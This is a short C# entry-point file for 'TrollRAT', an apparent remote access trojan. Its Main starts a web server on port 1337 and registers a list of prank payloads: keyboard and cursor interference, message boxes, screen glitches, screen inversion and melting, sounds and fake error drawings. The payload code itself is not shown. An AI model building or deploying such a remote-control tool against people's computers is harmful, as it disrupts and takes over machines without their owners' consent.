using System;

using TrollRAT.Server;

namespace TrollRAT
{
    static class Program
    {
        /// <summary>
        /// Der Haupteinstiegspunkt für die Anwendung.
        /// </summary>
        [STAThread]
        static void Main()
        {
            var server = new WebServer(1337);

            server.Payloads.Add(new PayloadOpen());

            server.Payloads.Add(new PayloadMessageBox());
            server.Payloads.Add(new PayloadKeyboard());
            server.Payloads.Add(new PayloadCursor());
            server.Payloads.Add(new PayloadGlitch());
            server.Payloads.Add(new PayloadTunnel());
            server.Payloads.Add(new PayloadReverseText());
            server.Payloads.Add(new PayloadSound());
            server.Payloads.Add(new PayloadDrawErrors());
            server.Payloads.Add(new PayloadInvertScreen());

            server.Payloads.Add(new PayloadEarthquake());
            server.Payloads.Add(new PayloadMeltingScreen());

            server.run();
        }
    }
}
